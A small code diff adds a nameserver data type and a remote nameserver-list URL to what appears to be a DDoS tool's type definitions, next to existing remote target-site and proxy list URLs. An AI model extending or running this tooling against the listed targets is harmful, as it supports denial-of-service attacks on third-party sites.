@@ -3,6 +3,11 @@ export interface ProxyData {
   id: number;
   ip: string;
 }
+export interface NameserverData {
+  host: string;
+  nameserverHost: string;
+  nameserverIp: string;
+}
 
 export interface SiteData {
   atack: number;
@@ -22,6 +27,11 @@ export interface TargetData {
 
 export type DoserEventType = 'atack' | 'error';
 
-export type GetSitesAndProxiesResponse = { sites: SiteData[]; proxies: ProxyData[]}
+export type GetSitesAndProxiesResponse = {
+  sites: SiteData[];
+  proxies: ProxyData[];
+  nameservers: NameserverData[];
+}
 export const sitesUrl = 'https://raw.githubusercontent.com/opengs/uashieldtargets/v2/sites.json'
 export const proxiesUrl = 'https://raw.githubusercontent.com/opengs/uashieldtargets/v2/proxy.json'
+export const nameserversUrl = 'https://raw.githubusercontent.com/opengs/uashieldtargets/v2/nameservers.json'
